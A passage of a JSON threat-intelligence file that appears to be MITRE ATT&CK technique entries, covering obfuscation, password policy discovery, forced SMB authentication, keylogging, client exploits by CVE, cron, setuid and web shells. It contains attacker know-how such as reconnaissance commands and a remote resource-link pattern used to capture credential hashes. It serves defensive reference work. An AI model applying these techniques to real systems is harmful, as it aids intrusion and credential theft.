      "Some  strings are base64 encoded such as the embedded DLL known as MockDll.",
      "can encrypt the resulting data generated from C2 commands with RC4.",
      "can encrypt data using AES prior to exfiltration.",
      "can hash functions to obfuscate calls to the Windows API and use a public/private key pair to encrypt Beacon session metadata.",
      "uses heavily obfuscated code in its Windows Notepad backdoor.",
      "has used malware with string encryption.  has also encrypted data and has encoded PowerShell commands using Base64.  has used `PyArmor` to obfuscate code execution of .  Additionally  has obfuscated downloaded files by renaming them as commonly used tools and has used `echo` instead of file names themselves to execute files.",
      "can use a custom Base64 alphabet to encode an API decryption key.",
      "delivers encrypted payloads in pieces that are then combined together to form a new portable executable (PE) file during installation.",
      "can require a password to activate the backdoor and uses RC4 encryption or static library encryption `libtomcrypt`.",
      "uses mixed-case letters for filenames and commands to evade detection.",
      "The  first stage script is obfuscated using random alpha numeric strings.",
      "obfuscates configuration and other static files using native Go libraries such as `garble` and `gobfuscate` to inhibit configuration analysis and static detection.",
      "has been distributed in ISO archives.  has been delivered in encrypted password-protected ZIP archives.",
      "has obfuscated the AES key used for encryption.",
      "obfuscated collected system information using a FNV-1a + XOR algorithm.",
      "has used SmartAssembly to obfuscate .NET payloads.",
      "has used Base64 to encode malicious links.",
      "strings network data configuration and modules are encrypted with a modified RC4 algorithm.",
      "can encrypt the names of requested APIs."
    ],
    "id": "T1027",
    "name": "Obfuscated Files or Information",
    "similar_words": [
      "Obfuscated Files or Information"
    ]
  },
  "attack-pattern--b53dbcc6-147d-48bb-9df4-bcb8bb808ff6": {
    "description": "The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common  keyboard interrupts like ctrl+c and ctrl+d. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format trap 'command list' signals where \"command list\" will be executed when \"signals\" are received.",
    "example_uses": [],
    "id": "T1154",
    "name": "Trap",
    "similar_words": [
      "Trap"
    ]
  },
  "attack-pattern--b6075259-dba3-44e9-87c7-e954f37ec0d5": {
    "description": "Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as net accounts (/domain), Get-ADDefaultDomainPasswordPolicy, chage -l <username>, cat /etc/pam.d/common-password, and pwpolicy getaccountpolicies (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. show aaa, show aaa common-criteria policy all).(Citation: US-CERT-TA18-106A)Password policies can be discovered in cloud environments using available APIs such as GetAccountPasswordPolicy in AWS (Citation: AWS GetPasswordPolicy).",
    "example_uses": [
      "has used net.exe in a script with net accounts /domain to find the password policy of a domain.",
      "collects password policy information with the command net accounts.",
      "The net accounts and net accounts /domain commands with  can be used to obtain password policy information.",
      "can discover the password policies applied to the target system.",
      "can collect password policy information on the target environment.",
      "During  the threat actors used the `net accounts` command as part of their advanced reconnaissance.",
      "has used the NtdsAudit utility to collect information related to accounts and passwords.",
      "has used net accounts and net accounts /domain to acquire password policy information.",
      "can use Get-PassPol to enumerate the domain password policy."
    ],
    "id": "T1201",
    "name": "Password Policy Discovery",
    "similar_words": [
      "Password Policy Discovery"
    ]
  },
  "attack-pattern--b77cf5f3-6060-475d-bd60-40ccbf28fdc2": {
    "description": "Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)There are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to file[:]//[remote address]/Normal.dotm to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \\\\[remote address]\\pic.png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)",
    "example_uses": [
      "used  to launch an authentication window for users to enter their credentials.",
      "has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.",
      "can use protocol handlers to coax the operating system to send NTLMv2 authentication responses to attacker-controlled infrastructure."
    ],
    "id": "T1187",
    "name": "Forced Authentication",
    "similar_words": [
      "Forced Authentication"
    ]
  },
  "attack-pattern--b8c5c9dd-a662-479d-9428-ae745872537c": {
    "description": "Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.\n\nBefore registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.\n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made. (Citation: Carnal Ownage Password Filters Sept 2013)",
    "example_uses": [
      "harvests plain-text credentials as a password filter registered on domain controllers."
    ],
    "id": "T1174",
    "name": "Password Filter DLL",
    "similar_words": [
      "Password Filter DLL"
    ]
  },
  "attack-pattern--b9f5dbe2-4c55-4fc5-af2e-d42c1d182ec4": {
    "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.",
    "example_uses": [
      "has used RAR to stage and compress local folders.",
      "adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.",
      "uses WinRAR to compress data that is intended to be exfiltrated.",
      "hides collected data in password-protected .rar archives.",
      "uses the zip -r command to compress the data collected on the local system.",
      "contains code to compress files.",
      "zips up files before exfiltrating them.",
      "will zip up the /Library/Keychains directory before exfiltrating it.",
      "compresses collected files with both the GZipStream class and a simple character replacement scheme before sending them to its C2 server.",
      "compressed data into .zip files prior to exfiltrating it.",
      "used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.",
      "has created password-protected RAR, WinImage, and zip archives to be exfiltrated.",
      "has used RAR to compress collected data before.",
      "can compress data with Zip before sending it over C2.",
      "extracted documents and bundled them into a RAR archive.",
      "has used tools to compress data before exfilling it.",
      "uses ZPP, a .NET console program, to compress files with ZIP.",
      "has compressed data into password-protected RAR archives prior to exfiltration.",
      "compressed data with zlib prior to sending it over C2.",
      "The  backdoor compresses communications using the standard Zlib compression library.",
      "compresses output data generated by command execution with a custom implementation of the Lempel–Ziv–Welch (LZW) algorithm.",
      "Modules can be pushed to and executed by  that copy data to a staging area, compress it, and XOR encrypt it.",
      "has compressed files before exfiltration using TAR and RAR.",
      "can compress data before sending it.",
      "After collecting documents from removable media,  compresses the collected files.",
      "Following data collection,  has compressed log files into a ZIP archive prior to staging and exfiltration.",
      "malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server.  malware RomeoDelta archives specified directories in .zip format, encrypts the .zip file, and uploads it to its C2 server.",
      "has used RAR to compress, encrypt, and password-protect files prior to exfiltration.",
      "has used RAR to compress files before moving them outside of the victim network.",
      "The  group has been known to compress data before exfiltration."
    ],
    "id": "T1002",
    "name": "Data Compressed",
    "similar_words": [
      "Data Compressed"
    ]
  },
  "attack-pattern--ba8e391f-14b5-496f-81f2-2d5ecd646c1c": {
    "description": "Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)",
    "example_uses": [
      "searches for files named logins.json to parse for credentials and also looks for credentials stored from browsers.",
      "gathers credentials in files for chrome, 1password, and keychains.",
      "can obtain passwords from common browsers and FTP clients.",
      "has a tool that can locate credentials in files on the file system such as those from Firefox or Chrome.",
      "DPAPI module can harvest protected credentials stored and/or cached by browsers and other user applications by interacting with Windows cryptographic application programming interface (API) functions.",
      "has used a plug-in to gather credentials stored in files on the host by various software programs, including The Bat! email client, Mozilla password manager, Google Chrome password manager, Outlook, Internet Explorer, and Windows Credential Store.",
      "contains the getFirefoxPassword function to attempt to locate Firefox passwords.",
      "If an initial connectivity check fails,  attempts to extract proxy details and credentials from Windows Protected Storage and from the IE Credentials Store. This allows the adversary to use the proxy credentials for subsequent requests if they enable outbound HTTP access.",
      "A module in  gathers logins and passwords stored in applications on the victims, including Google Chrome, Mozilla Firefox, and several other browsers.",
      "is capable of accessing locally stored passwords on victims."
    ],
    "id": "T1081",
    "name": "Credentials in Files",
    "similar_words": [
      "Credentials in Files"
    ]
  },
  "attack-pattern--bb0e0cb5-f3e4-4118-a4cb-6bf13bfbc9f2": {
    "description": "Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\\SOFTWARE\\Microsoft\\Netsh.\n\nAdversaries can use netsh.exe with helper DLLs to proxy execution of arbitrary code in a persistent manner when netsh.exe is executed automatically with another Persistence technique or if other persistent software is present on the system that executes netsh.exe as part of its normal functionality. Examples include some VPN software that invoke netsh.exe. (Citation: Demaske Netsh Persistence)\n\nProof of concept code exists to load Cobalt Strike's payload using netsh.exe helper DLLs. (Citation: Github Netsh Helper CS Beacon)",
    "example_uses": [
      "can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed."
    ],
    "id": "T1128",
    "name": "Netsh Helper DLL",
    "similar_words": [
      "Netsh Helper DLL"
    ]
  },
  "attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2": {
    "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).",
    "example_uses": [
      "logs the keystrokes on the targeted system.",
      "has used keyloggers.",
      "has used a keylogging tool called KEYPUNCH.",
      "uses a keylogger plugin to gather keystrokes.",
      "captures keystrokes and sends them back to the C2 server.",
      "collects keystrokes from the victim machine.",
      "uses a keylogger to capture keystrokes and location of where the user is typing.",
      "has a built-in keylogger.",
      "uses a keylogger to capture keystrokes.",
      "captures keystrokes.",
      "collects keystrokes from the victim’s machine.",
      "contains keylogging capabilities",
      "has the capability to log keystrokes from the victim’s machine.",
      "is capable of logging keystrokes.",
      "has used several different keyloggers.",
      "contains a custom keylogger.",
      "is capable of logging keystrokes.",
      "Get-Keystrokes Exfiltration module can log keystrokes.",
      "can perform keylogging.",
      "uses a keylogger to capture keystrokes it then sends back to the server after it is stopped.",
      "malware is capable of keylogging.",
      "The executable version of  has a module to log keystrokes.",
      "is capable of keylogging.",
      "has used keylogging tools.",
      "can log keystrokes.",
      "can track key presses with a keylogger module.",
      "has the ability to initiate keylogging.",
      "contains keylogging functionality to steal passwords.",
      "uses a keylogger and steals clipboard contents from victims.",
      "contains a keylogger module.",
      "contains a keylogger.",
      "contains a keylogger.",
      "can perform keylogging.",
      "When it first starts,  spawns a new thread to log keystrokes.",
      "can track key presses with a keylogger module.",
      "contains a keylogger.",
      "has the capability to capture keystrokes.",
      "The  RAT has a keylogger.",
      "contains a keylogger.",
      "contains keylogger functionality.",
      "has run a keylogger plug-in on a victim.",
      "is capable of performing keylogging.",
      "creates a new thread implementing a keylogging facility using Windows Keyboard Accelerators.",
      "can record keystrokes from both the keyboard and virtual keyboard.",
      "contains a keylogger component.",
      "contains keylogging functionality that will monitor for active application windows and write them to the log, it can handle special characters, and it will buffer by default 50 characters before sending them out over the C2 infrastructure.",
      "has keylogging functionality.",
      "captures and DES-encrypts credentials before writing the username and password to a log file, C:\\log.txt.",
      "has a keylogger.",
      "is capable of capturing keystrokes on victims.",
      "is capable of recording keystrokes.",
      "logs key strokes for configured processes and sends them back to the C2 server.",
      "contains a keylogger module that collects keystrokes and the titles of foreground windows.",
      "Malware used by  is capable of capturing keystrokes.",
      "malware KiloAlfa contains keylogging functionality.",
      "actors installed a credential logger on Microsoft Exchange servers.  also leveraged the reconnaissance framework, ScanBox, to capture keystrokes.",
      "has used a keylogging tool that records keystrokes in encrypted files.",
      "uses a sophisticated keylogger.",
      "has used tools to perform keylogging.",
      "can log mouse events.",
      "can conduct mouse event logging.",
      "has a module to perform any API hooking it desires.",
      "can collect mouse events.",
      "has used a compromised SSH client to capture the hostname port username and password used to establish an SSH connection from the compromised host.",
      "has utilized tools to capture mouse movements.",
      "intercepted and harvested credentials from user logins to compromised devices.",
      "captures user input into the Winlogon process by redirecting RPC traffic from legitimate listening DLLs within the operating system to a newly registered malicious item that allows for recording logon information in cleartext.",
      "has used credential harvesting websites.",
      "has used a PowerShell script to capture user credentials after prompting a user to authenticate to run a malicious script masquerading as a legitimate update item.",
      "captured submitted multfactor authentication codes and other technical artifacts related to remote access sessions during ."
    ],
    "id": "T1056",
    "name": "Input Capture",
    "similar_words": [
      "Input Capture"
    ]
  },
  "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63": {
    "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.Several types exist:### Browser-based ExploitationWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.### Office ApplicationsCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.### Common Third-party ApplicationsOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
    "example_uses": [
      "has exploited Adobe Flash vulnerability CVE-2018-4878 for execution.",
      "has exploited Microsoft Word vulnerability CVE-2014-4114 for execution.",
      "leverages a known zero-day vulnerability in Adobe Flash to execute the implant into the victims’ machines.",
      "leverages vulnerable versions of Flash to perform execution.",
      "had exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, and CVE-2017-0199.",
      "uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, and CVE-2015-1641.",
      "has used multiple software exploits for common client software, like Microsoft Word and Adobe Reader, to gain code execution as part of.",
      "has used Flash Player (CVE-2016-4117, CVE-2018-4878) and Word (CVE-2017-0199) exploits for execution.",
      "has exploited Microsoft Word vulnerability CVE-2017-0199 for execution.",
      "has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882.",
      "has used exploitation of endpoint software, including Microsoft Internet Explorer Adobe Flash vulnerabilities, to gain execution. They have also used zero-day exploits.",
      "has exploited vulnerabilities to gain execution including CVE-2017-11882 and CVE-2020-0674.",
      "has exploited Microsoft Office vulnerability CVE-2017-0262 for execution.",
      "has exploited CVE-2018-0798 in Equation Editor.",
      "has exploited Office vulnerabilities such as CVE-2017-11882 and CVE-2017-8570 for execution during delivery.",
      "has exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906).",
      "has exploited CVE-2011-0611 in Adobe Flash Player to gain execution on a targeted system.",
      "has exploited numerous ActiveX vulnerabilities including zero-days.",
      "leverages a known zero-day vulnerability in Adobe Flash to execute the implant into the victims machines.",
      "has taken advantage of a known vulnerability in Microsoft Word (CVE 2012-0158) to execute code.",
      "has used malicious documents containing exploits for CVE-2021-40444 affecting Microsoft MSHTML.",
      "has exploited Microsoft Office vulnerability CVE-2017-11882.",
      "has used multiple software exploits for common client software like Microsoft Word Exchange and Adobe Reader to gain code execution.",
      "has exploited multiple vulnerabilities for execution including Microsoft Office vulnerabilities CVE-2012-0158 CVE-2014-6352 CVE-2017-0199 and Adobe Flash CVE-2015-5119.",
      "has exploited CVE-2011-4369 a vulnerability in the PRC component in Adobe Reader.",
      "can attempt to exploit known vulnerabilities in Hadoop Redis or ActiveMQ when it finds those services running in order to conduct further execution.",
      "was installed via exploitation of a SolarWinds Orion API authentication bypass vulnerability (CVE-2020-10148).",
      "has exploited Microsoft Office vulnerabilities including CVE-2015-1641 CVE-2017-11882 and CVE-2018-0802.",
      "uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570 CVE-2012-1856 CVE-2014-4114 CVE-2017-0199 CVE-2017-11882 and CVE-2015-1641.",
      "has exploited multiple vulnerabilities for execution including Microsoft Office vulnerabilities (CVE-2009-3129 CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324 CVE-2009-0927 CVE-2011-0609 CVE-2011-0611).",
      "has been embedded in documents exploiting CVE-2017-0199 CVE-2017-11882 and CVE-2017-8570.",
      "has used exploits for multiple vulnerabilities including CVE-2014-0322 CVE-2012-4792 CVE-2012-1889 and CVE-2013-3893.",
      "has exploited CVE-2018-0798 for execution.",
      "During  the threat actors exploited CVE-2017-11882 to execute code on the victim's machine.",
      "had exploited multiple vulnerabilities for execution including Microsofts Equation Editor (CVE-2017-11882) an Internet Explorer vulnerability (CVE-2018-8174) CVE-2017-8570 CVE-2017-0199 and CVE-2017-8759.",
      "attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874 CVE-2010-1871 CVE-2017-10271 CVE-2018-2894 CVE-2016-3088 JBoss AS 3/4/5/6 and the Hadoop YARN ResourceManager.",
      "has exploited multiple Microsoft Office and .NET vulnerabilities for execution including CVE-2017-0199 CVE-2017-8759 and CVE-2017-11882.",
      "has used exploits for Flash Player (CVE-2016-4117 CVE-2018-4878) Word (CVE-2017-0199) Internet Explorer (CVE-2020-1380 and CVE-2020-26411) and Microsoft Edge (CVE-2021-26411) for execution.",
      "has exploited CVE-2017-0199 in Microsoft Word to execute code.",
      "has exploited the Adobe Flash Player vulnerability CVE-2015-3113 and Internet Explorer vulnerability CVE-2014-1776.",
      "has exploited Microsoft Office vulnerabilities CVE-2014-4114 CVE-2018-0802 and CVE-2018-0798 for execution.",
      "has crafted malicious files to exploit CVE-2012-0158 and CVE-2010-3333 for execution.",
      "has executed commands through Microsoft security vulnerabilities including CVE-2017-11882 CVE-2018-0802 and CVE-2012-0158.",
      "has exploited Microsoft vulnerabilities including CVE-2018-0798 CVE-2018-8174 CVE-2018-0802 CVE-2017-11882 CVE-2019-9489 CVE-2020-8468 and CVE-2018-0798 to enable execution of their delivered malicious payloads.",
      "has exploited CVE-2012-0158 and CVE-2010-3333 for execution against targeted systems.",
      "has exploited CVE-2012-0158 CVE-2014-1761 CVE-2017-11882 and CVE-2018-0802 for execution.",
      "has exploited Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802 to deliver the payload.",
      "leveraged the follow exploits in their operations: CVE-2012-0158 CVE-2015-1641 CVE-2017-0199 CVE-2017-11882 and CVE-2019-3396.",
      "During  the threat actors exploited Adobe Flash vulnerability CVE-2011-0611 Microsoft Windows Help vulnerability CVE-2010-1885 and several Internet Explorer vulnerabilities including CVE-2011-1255 CVE-2012-1889 and CVE-2014-0322.",
      "has exploited Microsoft Office vulnerabilities CVE-2012-0158 CVE-2017-11882 CVE-2018-0798 and CVE-2018-0802.",
      "has relied on CVE-2022-30190 (Follina) for execution during delivery.",
      "can exploit Oracle Java vulnerabilities for execution including CVE-2011-3544 CVE-2013-2465 CVE-2012-4681 and CVE-2013-2460.",
      "has used exploitation of endpoint software including Microsoft Internet Explorer Adobe Flash vulnerabilities to gain execution. They have also used zero-day exploits.",
      "has exploited Adobe Flash vulnerability CVE-2015-8651 for execution.",
      "has used RTF document that includes an exploit to execute malicious code. (CVE-2017-11882)",
      "has exploited client software vulnerabilities for execution such as Microsoft Word CVE-2012-0158.",
      "has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250) and attempted to gain remote code execution via a security bypass vulnerability (CVE-2017-11774).",
      "has exploited the Office vulnerability CVE-2017-0199 for execution.",
      "has installed legitimate but vulnerable Total Video Player software and wdigest.dll library drivers on compromised hosts to exploit stack overflow and input validation vulnerabilities for code execution.",
      "has leveraged vulnerabilities in client applications such as CVE-2017-11882 in Microsoft Office to enable code execution in victim environments.",
      "was installed through exploitation of CVE-2024-39717 in Versa Director servers.",
      "has used exploits to enable follow-on execution of frameworks such as Meterpreter.",
      "has exploited Office vulnerabilities during local execution such as CVE-2017-11882 and CVE-2018-0798.",
      "used the GrimResource exploitation technique via specially crafted MSC files for arbitrary code execution during .",
      "has used exploits for vulnerabilities such as CVE-2021-44228 CVE-2021-21974 and CVE-2022-0847 to achieve client code execution.",
      "has exploited CVE-2024-30088 to run arbitrary code in the context of `SYSTEM`."
    ],
    "id": "T1203",
    "name": "Exploitation for Client Execution",
    "similar_words": [
      "Exploitation for Client Execution"
    ]
  },
  "attack-pattern--c0a384a4-9a25-40e1-97b6-458388474bc8": {
    "description": "On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike [Scheduled Task](https://attack.mitre.org/techniques/T1053) on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).\n\n### cron\n\nSystem-wide cron jobs are installed by modifying /etc/crontab file, /etc/cron.d/ directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on macOS and Linux systems.\n\nThose methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.\n\n### at\n\nThe at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.\n\n### launchd\n\nEach launchd job is described by a different configuration property list (plist) file similar to [Launch Daemon](https://attack.mitre.org/techniques/T1160) or [Launch Agent](https://attack.mitre.org/techniques/T1159), except there is an additional key called StartCalendarInterval with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.",
    "example_uses": [
      "used a cron job for persistence on Mac devices."
    ],
    "id": "T1168",
    "name": "Local Job Scheduling",
    "similar_words": [
      "Local Job Scheduling"
    ]
  },
  "attack-pattern--c0df6533-30ee-4a4a-9c6d-17af5abdf0b2": {
    "description": "When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively  (Citation: setuid man page). Normally an application is run in the current user’s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via ls -l. The chmod program can set these bits with via bitmasking, chmod 4777 [file] or via shorthand naming, chmod u+s [file].\n\nAn adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user’s context. Additionally, adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future  (Citation: OSX Keydnap malware).",
    "example_uses": [
      "adds the setuid flag to a binary so it can easily elevate in the future."
    ],
    "id": "T1166",
    "name": "Setuid and Setgid",
    "similar_words": [
      "Setuid and Setgid"
    ]
  },
  "attack-pattern--c16e5409-ee53-4d79-afdc-4099dc9292df": {
    "description": "A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)\n\nWeb shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.",
    "example_uses": [
      "commonly created Web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files.",
      "has used Web shells to maintain access to victim websites.",
      "has used Web shells, often to maintain access to a victim network.",
      "is a Web shell.",
      "The  backdoor is a Web shell that supports server payloads for many different kinds of server-side scripting languages and contains functionality to access files, connect to a database, and open a virtual command prompt.",
      "is a Web shell that appears to be exclusively used by . It is installed as an ISAPI filter on Exchange servers and shares characteristics with the  Web shell.",
      "is a Web shell. The ASPXTool version used by  has been deployed to accessible servers running Internet Information Services (IIS).",
      "uses Web shells on publicly accessible Web servers to access victim networks."
    ],
    "id": "T1100",
    "name": "Web Shell",
    "similar_words": [
      "Web Shell"
    ]
  },
  "attack-pattern--c1a452f3-6499-4c12-b7e9-a6a0a102af76": {
    "description": "Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)\n\nAdversaries may leverage TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055) called Process Doppelgänging. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1093), Process Doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process Doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext. (Citation: BlackHat Process Doppelgänging Dec 2017)\n\nProcess Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):\n\n* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load – Create a shared section of memory and load the malicious executable.\n* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate – Create a process from the tainted section of memory and initiate execution.",
    "example_uses": [
      "abuses NTFS transactions to launch and conceal malicious processes."
    ],
    "id": "T1186",
    "name": "Process Doppelgänging",
    "similar_words": [
      "Process Doppelgänging"
    ]
  },
  "attack-pattern--c1b11bf7-c68e-4fbf-a95b-28efbe7953bb": {
